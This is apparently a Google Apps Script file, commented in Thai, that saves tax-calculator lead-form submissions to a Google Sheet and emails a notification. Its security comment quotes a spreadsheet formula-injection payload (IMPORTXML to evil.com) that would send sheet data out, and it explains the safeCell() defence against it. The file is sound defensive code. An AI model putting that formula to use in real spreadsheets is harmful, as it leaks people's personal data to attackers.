/**
 * IC Tax Check — รับข้อมูลลูกค้าจากหน้าเว็บ ลง Google Sheet
 *
 * วิธีติดตั้ง (ทำครั้งเดียว ประมาณ 5 นาที)
 * 1. สร้าง Google Sheet ใหม่ ชื่อ "IC Tax Check – Leads"
 * 2. เมนู ส่วนขยาย > Apps Script แล้ววางโค้ดนี้ทั้งหมด กดบันทึก
 * 3. กด ทำให้ใช้งานได้ > การทำให้ใช้งานได้รายการใหม่ > ประเภท "เว็บแอป"
 *    - เรียกใช้ในฐานะ: ฉัน
 *    - ผู้ที่มีสิทธิ์เข้าถึง: ทุกคน
 * 4. คัดลอก URL ของเว็บแอป ไปใส่ที่ IC_CONFIG.submitUrl ในไฟล์ public/tax-calculator.html
 * 5. ตั้ง SUBMIT_TOKEN ข้างล่างให้ตรงกับ IC_CONFIG.submitToken ในไฟล์เดียวกัน
 *
 * ── เรื่องความปลอดภัยที่ต้องรู้ ──
 * เว็บแอปนี้เปิดให้ "ทุกคน" เรียกได้ (จำเป็น เพราะผู้กรอกไม่ได้ล็อกอิน Google)
 * แปลว่าใครก็ยิงข้อมูลเข้ามาได้ถ้ารู้ URL โค้ดนี้จึงต้องกันสามเรื่อง
 *
 *   1. สูตรใน Sheet — appendRow เขียนค่าที่ผู้ใช้พิมพ์ลงเซลล์ตรงๆ
 *      ถ้าใครกรอกชื่อว่า =IMPORTXML("http://evil.com?d="&A2,"//a")
 *      Google Sheets จะ "รัน" มันเป็นสูตร แล้วส่งข้อมูลในชีตออกไปให้คนนอกได้จริง
 *      ทุกค่าจึงถูกส่งผ่าน safeCell() ก่อนเสมอ
 *
 *   2. หัวอีเมล — ถ้าชื่อมีตัวขึ้นบรรทัดใหม่ปนมา อาจแทรกหัวอีเมลเพิ่มได้
 *      subject จึงตัดตัวขึ้นบรรทัดทิ้งทั้งหมด
 *
 *   3. สแปม — กันด้วยสามชั้น คือ token, เวลาที่ใช้กรอก, และเพดานต่อชั่วโมง
 *      ไม่มีชั้นไหนกัน attacker ที่ตั้งใจจริงได้ แต่กันบอตยิงมั่วได้เกือบหมด
 *      ชั้นที่กัน "ของเสีย" จริงๆ คือข้อ 1 กับ 2 ข้างบน
 */

/** ต้องตรงกับ IC_CONFIG.submitToken ในหน้าเว็บ — เปลี่ยนทั้งสองที่พร้อมกันเสมอ */
const SUBMIT_TOKEN = "ic-tax-2569";

/** เว้นว่าง = ไม่ส่งอีเมลแจ้งเตือน */
const NOTIFY_EMAIL = "contact@icaccservice.com";

/** รับได้กี่รายการต่อชั่วโมง — กันคนกดรัวหรือบอตถล่ม */
const MAX_PER_HOUR = 40;

/** ผู้กรอกจริงต้องใช้เวลาอย่างน้อยเท่านี้ (มิลลิวินาที) บอตยิงทันทีที่โหลดเสร็จ */
const MIN_FILL_MS = 3000;

const HEADERS = ["วันที่ส่ง", "ชื่อ", "เบอร์โทร", "LINE", "อีเมล", "ต้องการให้ช่วย", "ข้อความ",
  "แบบ", "ปีภาษี", "เงินได้", "เงินได้สุทธิ", "ภาษี", "จ่ายเพิ่ม(+)/คืน(-)", "ประหยัดได้ตามแผน", "สรุป", "หน้าเว็บ"];

/**
 * ทำให้ค่าปลอดภัยพอจะเขียนลงเซลล์
 *
 * Sheets ตีความเซลล์ที่ขึ้นต้นด้วย = + - @ หรือ tab/CR ว่าเป็นสูตร
 * การเติม ' ข้างหน้าบังคับให้เป็นข้อความล้วน ซึ่งผู้อ่านในชีตจะไม่เห็นเครื่องหมายนี้
 */
function safeCell(value, maxLen) {
  var s = (value === null || value === undefined) ? "" : String(value);
  s = s.slice(0, maxLen || 500);
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
  return s;
}

/** ตัวเลขที่เชื่อถือได้เท่านั้น ค่าที่ไม่ใช่ตัวเลขกลายเป็นช่องว่าง ไม่ใช่ข้อความมั่ว */
function safeNum(value) {
  var n = Number(value);
  return isFinite(n) ? n : "";
}

function reply(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}

/** เผื่อมีคนเปิด URL นี้ตรงๆ ในเบราว์เซอร์ — ตอบสั้นๆ แทนหน้า error ของ Google */
function doGet() {
  return reply({ ok: false, error: "post_only" });
}

function doPost(e) {
  try {
    var data = JSON.parse((e && e.postData && e.postData.contents) || "{}");

    if (data.token !== SUBMIT_TOKEN) return reply({ ok: false, error: "bad_token" });
    if (data.consent !== true) return reply({ ok: false, error: "no_consent" });

    var name = String(data.name || "").trim();
    var phone = String(data.phone || "").trim();
    if (!name || phone.replace(/\D/g, "").length < 9) return reply({ ok: false, error: "missing_fields" });

    // กรอกเร็วเกินกว่ามนุษย์จะอ่านหน้าเว็บจบ — ทิ้งเงียบๆ
    // ตอบ ok: true เพื่อไม่ให้บอตรู้ว่าโดนจับได้แล้วไปลองวิธีอื่น
    if (Number(data.fillMs) >= 0 && Number(data.fillMs) < MIN_FILL_MS) return reply({ ok: true });

    var cache = CacheService.getScriptCache();
    var count = Number(cache.get("rate") || 0);
    if (count >= MAX_PER_HOUR) return reply({ ok: false, error: "rate_limited" });
    cache.put("rate", String(count + 1), 3600);

    // กันสองคนกดพร้อมกันแล้วเขียนทับแถวเดียวกัน
    var lock = LockService.getScriptLock();
    lock.waitLock(20000);
    try {
      var sheet = SpreadsheetApp.getActiveSpreadsheet().getSheets()[0];
      if (sheet.getLastRow() === 0) sheet.appendRow(HEADERS);

      var c = data.calc || {};
      var wants = Array.isArray(data.wants) ? data.wants.join(", ") : "";

      sheet.appendRow([
        new Date(),
        safeCell(name, 120),
        // ' นำหน้าเบอร์โทรไว้แต่เดิม เพื่อไม่ให้ Sheets ตัดเลข 0 ข้างหน้าทิ้ง
        "'" + safeCell(phone, 40),
        safeCell(data.line, 80),
        safeCell(data.email, 120),
        safeCell(wants, 300),
        safeCell(data.message, 2000),
        safeCell(c.form, 40),
        safeNum(c.year),
        safeNum(c.total),
        safeNum(c.net),
        safeNum(c.tax),
        safeNum(c.bal),
        safeNum(c.planSaving),
        safeCell(data.summary, 4000),
        safeCell(data.page, 300)
      ]);
    } finally {
      lock.releaseLock();
    }

    if (NOTIFY_EMAIL) {
      // หัวอีเมลห้ามมีตัวขึ้นบรรทัดใหม่ ไม่งั้นแทรกหัวอีเมลเพิ่มได้
      var subject = ("ลูกค้าใหม่จาก IC Tax Check: " + name).replace(/[\r\n]+/g, " ").slice(0, 150);
      MailApp.sendEmail(NOTIFY_EMAIL, subject,
        "ชื่อ: " + name +
        "\nโทร: " + phone +
        "\nLINE: " + (data.line || "-") +
        "\nอีเมล: " + (data.email || "-") +
        "\nต้องการ: " + (Array.isArray(data.wants) ? data.wants.join(", ") : "-") +
        "\n\n" + (data.message || "") +
        "\n\n" + (data.summary || ""));
    }

    return reply({ ok: true });
  } catch (err) {
    // ไม่ส่งรายละเอียด error กลับไปให้ผู้เรียก — บอกแค่ว่าไม่สำเร็จ
    // หน้าเว็บจะสลับไปเสนอช่องทาง LINE ให้ลูกค้าเองอยู่แล้ว
    console.error("doPost failed: " + err);
    return reply({ ok: false, error: "server_error" });
  }
}
